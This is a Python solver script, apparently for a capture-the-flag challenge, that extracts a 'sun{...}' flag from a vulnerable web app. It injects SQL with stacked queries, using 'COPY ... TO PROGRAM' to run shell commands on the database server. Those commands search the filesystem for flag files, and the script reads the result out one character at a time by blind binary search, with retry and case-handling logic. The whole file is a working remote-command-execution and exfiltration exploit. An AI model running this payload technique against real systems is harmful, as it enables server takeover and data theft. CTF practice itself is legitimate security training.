#!/usr/bin/env python
"""Finish the flag: handles uppercase characters, which the payload lower-casing makes
untypeable.

Position 25 answered `[[:upper:]]` true and `[[:lower:]]` false, so the flag contains a capital
letter -- and every class I send has already been folded to lower case by the app. The fix is
to search case-INsensitively (`grep -qi`, so my `[f]` also matches `F`) and then settle the
case with one case-SENSITIVE probe on the single character: if `^prefix[f]` is false while
`^prefix[f]` under -i is true, the real byte is `F`.

Positions are verified one by one (`^prefix` must hold, and something must follow unless the
character was `}`), and a failed character is re-searched, because a single timeout reads as
"no match" and would otherwise corrupt every later position.
"""
import string
import sys

import extract as E

CAND = "{}" + string.digits + string.ascii_lowercase + "_-.@!+~"
FIND = ('f=$(find / -name "*flag*" -type f -exec grep -ls sun{ {} + 2>/dev/null | head -1); '
        'grep -aoE "sun[{][^}]*[}]" "$f" | head -1')


def klass(chars):
    body = "".join(c for c in chars if c != "-")
    return "[" + body + ("-" if "-" in chars else "") + "]"


def head_of(prefix):
    return "^" + "".join(klass(c) for c in prefix.lower())


def P(pattern, ic=False):
    fl = "grep -q%sE" % ("i" if ic else "")
    cmd = '%s | %s "%s"' % (FIND, fl, pattern)
    return E.ask("MARS'; COPY (SELECT 1) TO PROGRAM '%s'; SELECT 1; -- " % cmd)


def ask(pattern, ic=False, tries=3):
    for _ in range(tries):
        if P(pattern, ic):
            return True
    return False


def char_at(prefix):
    head = head_of(prefix)
    lo, hi = 0, len(CAND) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(head + klass(CAND[lo:mid + 1]), True):
            hi = mid
        else:
            lo = mid + 1
    c = CAND[lo]
    if not ask(head + klass(c), True):
        return None
    if ask(head + klass(c), False):
        return c                       # matched case-sensitively: exactly this byte
    return c.upper() if c.isalpha() else "?"


def verify(prefix):
    head = head_of(prefix)
    if not ask(head, True):
        return False
    if prefix.endswith("}"):
        return not ask(head + ".", True)
    return ask(head + ".", True)


def run(prefix="", cap=140):
    while len(prefix) < cap:
        c = None
        for _ in range(4):
            got = char_at(prefix)
            if got and verify(prefix + got):
                c = got
                break
            print("   retry at position %d (got %r)" % (len(prefix) + 1, got), flush=True)
        if c is None:
            print("[-] stuck at position %d" % (len(prefix) + 1), flush=True)
            return prefix
        prefix += c
        print("   %-46s (%d calls)" % (prefix, E.CALL[0]), flush=True)
        if c == "}":
            return prefix
    return prefix


if __name__ == "__main__":
    v = run(sys.argv[1] if len(sys.argv) > 1 else "")
    print("[+] %s" % v, flush=True)
    if v.startswith("sun{") and v.endswith("}"):
        open("flag.txt", "w").write(v.strip() + "\n")
